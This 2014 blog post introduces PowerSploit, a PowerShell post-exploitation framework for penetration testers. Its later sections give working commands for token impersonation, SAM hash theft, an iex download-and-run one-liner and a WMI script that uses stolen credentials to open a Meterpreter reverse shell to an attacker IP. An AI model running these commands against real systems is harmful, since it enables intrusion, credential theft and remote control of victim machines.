---
title: PowerSploit
author: Matt Graeber
type: post
date: 2014-07-08T16:00:53+00:00
url: /2014/07/08/powersploit/
categories:
  - InfoSec
  - Security
  - Module Spotlight
  - PowerSploit
tags:
  - InfoSec
  - Security
  - Modules
  - PowerSploit

---
[PowerSploit][1] is an offensive security framework for penetration testers and reverse engineers. It was born out of the realization that PowerShell was the ideal post-exploitation utility in Windows due to its ability to perform a wide range of administrative and low-level tasks all without the need to drop malicious executables to disk, thus, evading antivirus products with ease. PowerSploit is a collection of modules broken down into the following high-level tasks:

  1. CodeExecution &#8211; Perform low-level code execution and code injection.
  2. ScriptModification &#8211; Modify and/or prepare scripts for execution on a compromised machine.
  3. Persistence &#8211; Add persistence capabilities to a PowerShell script.
  4. PETools &#8211; Parse/manipulate Windows portable executables.
  5. Capstone &#8211; A PowerShell binding for the [Capstone Engine][2] disassembly framework.
  6. ReverseEngineering &#8211; A wide range of reverse engineering tools
  7. AntivirusBypass &#8211; Defeat AV byte signatures in executables.
  8. Exfiltration &#8211; Steal sensitive data from a compromised machine.
  9. Mayhem &#8211; Perform destructive actions.
 10. Recon &#8211; Tools to aid in the reconnaissance phase of a penetration test

PowerSploit was created by [Matt Graeber][3] (@mattifestation) and its current maintainer and primary developer is [Chris Campbell][4] (@obscuresec). It has also greatly benefitted by the contributions of [Joe Bialek][5] (@JosephBialek) and [Rich Lundeen][6] (@RichLundeen).

PowerSploit&#8217;s claim to fame is that it was the first offensive security framework written for PowerShell. However, it&#8217;s certainly not the only game in town. [Nishang][7], written by [Nikhil Mittal][8] (@nikhil_mitt) and the [post-exploitation module][9] in Posh-SecMod written by [Carlos Perez][10] (@Carlos_Perez), and <a href="https://www.veil-framework.com/veil-powerview" title="Veil-PowerView" target="_blank">Veil-PowerView</a> by <a href="http://www.harmj0y.net/blog/" title="Will Schroeder's blog" target="_blank">Will Schroeder</a> (@harmj0y) are all outstanding alternatives and complements to PowerSploit worth checking out.

Prior to the inception of _PowerSploit_, _PowerSyringe_ was developed &#8211; a PowerShell implementation of a shellcode injection utility called [Syringe][11]. For those unfamiliar with the concept, a shellcode injection utility is a tool that writes and executes a series of malicious assembly language instructions into a targeted process. There are many malicious tasks that shellcode payloads will perform but the most common payload will typically spawn a reverse shell &#8211; i.e. connect to an attacker controlled machine from which malicious commands are received and executed.

As the desire for more offensive tools increased, and more tools were developed, it was only natural to break out functionality into single ps1 files and package everything into a module while mostly adhering to PowerShell best practices. As more tools were developed and the scope of the project increased it also made more sense to rename the project to something that reflected its evolution into a full-fledged PowerShell-based offensive security framework that offered a subset of the functionality present in MetaSploit. PowerSploit was a natural choice.

Enough background. Let’s see PowerSploit in action…

_Invoke-ShellcodeMSIL_ is a variant of Invoke-Shellcode. They are both shellcode execution scripts but _Invoke-ShellcodeMSIL_ was chosen for this example because if the shellcode has a return value, it will be returned to your PowerShell session. This makes for a better demonstration. Invoke-Shellcode is more powerful but it will not return output to the PowerShell session.

_Invoke-ShellcodeMSIL_ will be used to invoke the following X64 assembly language code:

<pre class="brush: plain; title: ; notranslate" title="">MOV RAX, 0x10
MOV RCX, 0x10
ADD RAX, RCX
RET
</pre>

This shellcode simply adds 16 and 16 and returns the sum. The byte representation of the shellcode is seen in the example that follows.

<pre class="brush: powershell; title: ; notranslate" title="">Invoke-ShellcodeMSIL -Shellcode @(0xB8,16,0,0,0,0xB9,0x10,0,0,0,0x48,1,0xC8,0xC3)
</pre>

This was just a simple non-malicious proof of concept example but it should serve as a sufficient demonstration of PowerShell’s ability to perform low-level code execution. Now, using the Capstone module in PowerSploit we can disassemble the assembly language code from the previous example.

```
Get-CSDisassembly -Architecture X86 -Mode Mode64 -Code @(0xB8,16,0,0,0,0xB9,0x10,0,0,0,0x48,1,0xC8,0xC3) 

Address    Mnemonic Operands
-------    -------- --------
0x00000000 mov      eax, 0x10
0x00000005 mov      ecx, 0x10
0x0000000A add      rax, rcx
0x0000000D ret
```

Invoke-TokenManipulation_ can be used to enumerate available logon tokens on a system and impersonate any one of them. For example, Invoke-TokenManipulation can be used to spawn a process as NT AUTHORITY\SYSTEM

<pre class="brush: powershell; title: ; notranslate" title="">Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -Username 'NT AUTHORITY\SYSTEM' -CreateProcess cmd.exe
</pre>

A common post-exploitation task performed is to steal password hashes by obtaining the SAM database on a workstation or the ntds.dit database on a domain controller. These files are locked by the kernel and cannot be accessed using built-in Windows tools. Fortunately, there are two methods of obtaining these files with _PowerSploit&#8211;Get/Mount-VolumeShadowCopy_ and _Invoke-NinjaCopy_.

The first example shows how a backed up version of the SAM database can be copied with ease by obtaining it within a mounted volume shadow copy.

<pre class="brush: powershell; title: ; notranslate" title="">Get-VolumeShadowCopy | Mount-VolumeShadowCopy -Path $PWD
cp $PWD\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
</pre>

The next example demonstrates Invoke-NinjaCopy being used to extract the live SAM database by getting a handle to the raw disk and carving out the target file from the relevant NTFS data structures.

<pre class="brush: powershell; title: ; notranslate" title="">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination $PWD\SAM
</pre>

There are many other useful tools present in PowerSploit which cannot all be covered in the interest of time. The following tools merit an honorable mention, however:

  * Invoke-Mimikatz – Load and execute a strictly memory-resident copy of [Mimikatz][12] – a full-featured credential dumping utility
  * Invoke-DllInjection – Inject a malicious DLL into a target process
  * Add-Persistence – Add persistence capabilities to any script or script block
  * Get-GPPPassword – Retrieve plain text group policy preference passwords
  * Get-VaultCredential – Retrieve Windows vault credentials
  * Get-TimedScreenshot – Take screenshots from a victim machine
  * Get-Keystrokes – Keylogger
  * Invoke-Portscan – Port scanner
  * Out-Minidump – Dump process memory to disk for offline analysis and/or credential harvesting
  * Get-PEHeader – Parse PE files on disk and in memory
  * Get-ILDisassembly – A .NET method disassembler
  * Get-Member (proxy function) – Display non-public .NET members by adding the -Private switch to Get-Member
  * Get-Strings – Print human-readable strings from memory
  * Out-EncryptedScript – Script encryption utility
  * Set-CriticalProcess – Cause Windows to blue screen upon exiting the process

Pentesters often ask how to perform the initial infection of a machine with PowerShell and how to go about obtaining and executing PowerSploit scripts on the victim machine. Remote PowerShell code execution can be achieved via the following, non-exhaustive list of techniques:

  1. PowerShell remoting &#8211; Requirements: Remoting must be enabled and the attacker has obtained user credentials
  2. WMI – Requirements: WMI service must be running, DCOM ports allowed through the firewall, and administrative credentials (in most cases)
  3. PsExec – Requirements: SMB allowed through the firewall and user credentials
  4. An exploit – Requirements: Remotely exploitable software and a sufficiently engineered exploit capable of bypassing all enabled exploit mitigations
  5. A command injection vulnerability – Requirements: A vulnerable service that fails to sanitize potentially malicious user input and consequently executes the malicious user input

Obtaining and executing malicious PowerSploit functions is made easy in PowerShell with the help of the .NET WebClient class and _Invoke-Expression_. Once code execution is gained on a victim machine, all the takes is a simple one-liner to download and execute a payload:

<pre class="brush: powershell; title: ; notranslate" title="">powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')"
</pre>

While this one-liner is ugly and certainly doesn’t conform to a single PowerShell best-practice, it is all an attacker needs to execute any arbitrary code on a compromised machine entirely in memory and all without having to worry about the execution policy.

To demonstrate an initial remote compromise in action, we will use WMI, specifically the static Create method of the _Win32_Process_ object to download and execute Invoke-Shellcode on a victim machine for which we have stolen credentials. Once executed, it will connect to the attacker controlled machine and spawn a reverse shell using HTTP as its transport.

```
$VictimIP = '192.168.124.130'
$AttackerIP = '192.168.124.1'
$Hostname = 'WIN-92SPQPW9R24'
$Username = 'DevelopersDevelopersDevelopers'
$Credential = Get-Credential -Credential "$Hostname\$Username"

# Attacker then enters the password of the user

$Command = {Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost $AttackerIP -Lport 80}
$InvokeShellcodeUrl = 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'
$PayloadString = "iex(New-Object Net.WebClient).DownloadString('$InvokeShellcodeUrl');$Command"

$Parameters = @{
    ComputerName = $VictimIP
    Credential = $Credential
    Class = 'Win32_Process'
    Name = 'Create'
    ArgumentList = "powershell -nop -c $PayloadString"
}

Invoke-WmiMethod @Parameters
```

As a final note, some astute readers may have noticed that the overwhelming majority of scripts present in PowerSploit are written in PowerShell 2.0 syntax. This is necessary because it is naïve for a pentester to think that an organization will ever have the latest version of PowerShell deployed. At the same time, it is exceedingly unlikely that PowerShell 1.0 will be installed on a machine thus, 2.0 syntax was chosen as the lowest common denominator. Additionally, most scripts in PowerSploit are packaged as individual scripts and they rarely contain any external dependencies. This makes it so that a pentester doesn’t have to download PowerSploit in its entirety to a victim machine. He/she only has to download just enough code to achieve their goal.

Hopefully by now, you have a better understanding of the capabilities of and motivations behind PowerSploit. Happy hacking!

[1]: https://github.com/mattifestation/PowerSploit
[2]: http://www.capstone-engine.org/
[3]: http://www.exploit-monday.com/
[4]: http://obscuresecurity.blogspot.com/
[5]: http://clymb3r.wordpress.com/
[6]: http://webstersprodigy.net/
[7]: https://github.com/samratashok/nishang
[8]: http://www.labofapenetrationtester.com/
[9]: https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
[10]: http://www.darkoperator.com/
[11]: http://www.securestate.com/Documents/syringe.c
[12]: http://blog.gentilkiwi.com/mimikatz